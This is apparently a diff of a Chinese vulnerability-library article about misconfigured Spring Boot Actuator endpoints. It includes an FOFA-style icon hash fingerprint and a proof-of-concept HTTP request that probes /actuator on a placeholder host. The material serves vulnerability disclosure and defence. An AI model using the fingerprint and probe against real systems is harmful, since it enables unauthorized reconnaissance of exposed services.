@@ -34,7 +34,7 @@ source: "gelusus/wxvl 公众号漏洞文库"
 Actuator是  
 Spring Boot  
 提供的服务监控和管理中间件。当  
-Spring Boot   
+Spring Boot   
 应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些系统信息泄露、XXE、甚至是RCE等安全问题。  
   
   
@@ -58,13 +58,13 @@ icon_hash="116323821"
   
 漏洞复现  
   
- POC  
+ POC  
   
 ```
-GET /actuator HTTP/1.1
+GET /actuator HTTP/1.1
 Host: your-ip
-User-Agent: Mozilla/5.0 (Windows NT 10.0;
-Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116
+User-Agent: Mozilla/5.0 (Windows NT 10.0;
+Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116
 Safari/537.36
 Accept-Encoding: gzip, deflate
 Accept: */*
